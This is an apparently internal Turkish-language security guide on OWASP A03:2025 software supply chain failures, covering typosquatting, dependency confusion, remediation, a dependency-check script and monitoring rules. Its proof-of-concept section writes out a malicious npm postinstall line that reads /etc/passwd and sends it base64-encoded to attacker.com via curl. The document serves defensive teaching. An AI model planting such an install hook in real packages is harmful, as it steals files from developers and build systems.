# TODO: OWASP A03:2025 — Yazilim Tedarik Zinciri Hatalari

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | OWASP A03:2025 |
| **Kritiklik** | Kritik |
| **Kategori Klasoru** | Tedarik_Zinciri/ |
| **Kaynak Arastirma** | [OWASP_Top_10_2025_Kapsamli_Guvenlik_Analizi_Raporu.pdf](../Arastirmalar/OWASP_Top_10_2025_Kapsamli_Guvenlik_Analizi_Raporu.pdf) |
| **Tarih** | 2026-03-17 |
| **Mevcut Dokuman** | [A03_Software_Supply_Chain_Failures.md](../OWASP_Top_10/A03_Software_Supply_Chain_Failures.md) |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** Yazilim Tedarik Zinciri Hatalari, uygulamalarin kullandigi dis bagimliliklarin (kutuphaneler, frameworkler, konteyner imajlari) guvenlik aciklari icermesi, kotu amacli paketlerin ekosisteme sizmasi veya CI/CD pipeline'larinin ele gecirilmesi sonucu ortaya cikan guvenlik risklerini kapsar. OWASP Top 10:2025'de 3. sirada yer alan bu kategori, modern yazilim gelistirme sureclerinin artan bagimliligi nedeniyle kritik onem tasimaktadir.
*   **Etkilenen bilesenler:** Paket yoneticileri (npm, pip, Maven, NuGet), acik kaynak kutuphaneler, konteyner imajlari, CI/CD pipeline'lari, build sistemleri, ucuncu parti API'ler, gelistirici araclari

---

### 2. Teknik detay (nasil calisiyor)
*   Tedarik zinciri saldirilari, yazilim gelistirme ve dagitim surecindeki guven iliskilerini hedef alir. Saldirganlar, dogrudan hedef uygulamayi degil, uygulamanin bagimli oldugu bilesenleri hedef alarak genis etkili saldirilar gerceklestirir.
*   Yaygın ortaya cikis bicimleri:
    *   Populer acik kaynak kutuphanelere kotu amacli kod enjeksiyonu (dependency confusion, typosquatting)
    *   Bilinen guvenlik aciklarina sahip eski bagimliliklarin guncellenmemesi
    *   CI/CD pipeline'larinda yetersiz erisim kontrolu ve kod inceleme sureclerinin atlanmasi
    *   Konteyner imajlarinda guvenlik acigi bulunan temel katmanlarin kullanilmasi
    *   Paket yoneticilerinde dijital imza dogrulamasinin yapilmamasi
*   **Neden:** Bagimliliklarin kara kutu olarak ele alinmasi, SBOM (Software Bill of Materials) olusturulmadigindan dolayi gorunurluk eksikligi, "ise yariyor, dokunma" zihniyeti ile guncellemelerin ertelenmesi ve CI/CD pipeline guvenliginin ihmal edilmesi.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** Populer bir npm kutuphanesinin yeni surumune kotu amacli kod enjeksiyonu (dependency confusion senaryosu)
*   **2. Normal durum:**
    ```
    npm install popular-library@2.1.0
    # Kutuphane beklenen islevi gerceklestirir
    # package.json: "popular-library": "^2.1.0"
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```
    # Saldirgan, ic paket adiyla ayni isimde public paket yayinlar
    # veya populer pakete typosquatting uygular
    npm install popular-libary@2.1.0  # 'r' eksik - typosquatting
    # Kotu amacli paket postinstall script'i calistirir:
    # "postinstall": "node -e \"require('child_process').exec('curl attacker.com/exfil?data='+Buffer.from(require('fs').readFileSync('/etc/passwd')).toString('base64'))\""
    ```
*   **4. Analiz:** Saldirgan, typosquatting veya dependency confusion yoluyla kotu amacli paketi yayinlar. Gelistirici yanlis paket adini yazdigi veya ic paket deposu duzgun yapilandirilmadigi icin kotu amacli paket yuklenir. Paket, `postinstall` asamasinda otomatik olarak kotu amacli kodu calistirir.
*   **5. Kanit:** Paket kurulumu sirasinda hassas veriler saldirganin sunucusuna gonderilir, reverse shell alinir veya sistemde kalici erisim saglanir.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Kritik
*   **CVSS Skoru:** N/A (kategori bazli risk)
*   **Saldiri Yuzeyi:** Internete acik, Gelistirici ortami, CI/CD pipeline
*   **Karmasiklik:** Orta

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** Bilinen zafiyetli bagimliliklari `npm audit`, `pip audit`, `mvn dependency-check` ile tarayip guncellemek, paket kilit dosyalarini (package-lock.json, Pipfile.lock) kullanmak, ozel paket deposu yapilandirmak.
*   **Orta vadeli:** SBOM (Software Bill of Materials) olusturma ve yonetme sureci kurmak, CI/CD pipeline'ina otomatik bagimllik tarama adimlari eklemek, dijital imza dogrulamasi uygulamak, bagimliliklarin duzgun incelenmesi icin kod inceleme sureclerini guclendirmek.
*   **Uzun vadeli:** Tedarik zinciri guvenlik politikasi olusturmak, sifir guven (zero trust) mimarisi ile CI/CD pipeline'larini yeniden tasarlamak, bagimliliklarin duzenli olarak guvenlik degerlendirmesini yapmak, gelistiricilere tedarik zinciri guvenligi egitimi vermek.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```json
// package.json - Gevşek surum sinirlamalari, kilit dosyasi yok
{
  "name": "my-app",
  "dependencies": {
    "express": "*",
    "lodash": "^4.0.0",
    "internal-utils": "latest"
  },
  "scripts": {
    "start": "node index.js"
  }
}
```

**Guvenli kod:**
```json
// package.json - Sabit surumler, guvenlik kontrolleri
{
  "name": "my-app",
  "dependencies": {
    "express": "4.18.2",
    "lodash": "4.17.21",
    "@myorg/internal-utils": "1.2.3"
  },
  "scripts": {
    "start": "node index.js",
    "preinstall": "npx npm-force-resolutions",
    "audit": "npm audit --audit-level=high",
    "check-deps": "node scripts/dependency-check.js"
  },
  "overrides": {}
}
```

```javascript
// scripts/dependency-check.js - Bagimllik dogrulama scripti
const { execSync } = require('child_process');
const fs = require('fs');

// Paket butunluk kontrolu
const lockFile = JSON.parse(fs.readFileSync('package-lock.json', 'utf8'));
const allowedScopes = ['@myorg'];

function checkDependencies() {
  // npm audit calistir
  try {
    execSync('npm audit --audit-level=high', { stdio: 'inherit' });
    console.log('[OK] Bilinen guvenlik acigi bulunamadi.');
  } catch (error) {
    console.error('[HATA] Guvenlik acigi tespit edildi! CI/CD durdurulacak.');
    process.exit(1);
  }

  // Beklenmeyen scope kontrolu
  const deps = Object.keys(lockFile.packages || {});
  deps.forEach(dep => {
    if (dep.startsWith('node_modules/@') && !allowedScopes.some(s => dep.includes(s))) {
      console.warn(`[UYARI] Bilinmeyen scope: ${dep}`);
    }
  });
}

checkDependencies();
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Tum projelerin bagimllik envanterini cikar
*   [ ] Mevcut SBOM durumunu degerlendir
*   [ ] CI/CD pipeline guvenlik kontrollerini incele
*   [ ] Kullanilan paket kaynaklarini (registry) belirle

**Duzeltme**
*   [ ] Bilinen zafiyetli bagimliliklari guncelle
*   [ ] Paket kilit dosyalarini (lock files) etkinlestir ve commit et
*   [ ] Dijital imza dogrulama mekanizmasi kur
*   [ ] CI/CD pipeline'ina otomatik bagimllik tarama adimlari ekle
*   [ ] Ozel (private) paket deposu yapilandir
*   [ ] SBOM olusturma surecini baslat

**Dogrulama**
*   [ ] `npm audit` / `pip audit` / `mvn dependency-check` taramalarini calistir
*   [ ] CI/CD pipeline guvenlik kontrollerinin calistigini dogrula
*   [ ] Typosquatting ve dependency confusion testleri yap
*   [ ] Penetrasyon testi yaptir

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   CI/CD ortaminda beklenmeyen paket kurulumlarini izle
    *   Build sirasinda dis ag baglantisi kuran paketleri tespit et
    *   Paket deposuna yetkisiz yuklemeleri izle
    *   Regex: `(?i)(npm install|pip install|mvn install).*(@latest|\*|>=)`
*   **Anomali Tespiti:**
    *   Build ortamindan anormal dis ag baglantilari
    *   Paket kurulumu sirasinda beklenmeyen child process olusturma
    *   Bagimllik agacinda yeni ve bilinmeyen paketlerin belirmesi
    *   CI/CD pipeline surelerinde beklenmeyen artislar

---

## Notlar
- OWASP Top 10:2025'de 3. sirada yer alir.
- Detayli rehber: [A03_Software_Supply_Chain_Failures.md](../OWASP_Top_10/A03_Software_Supply_Chain_Failures.md)
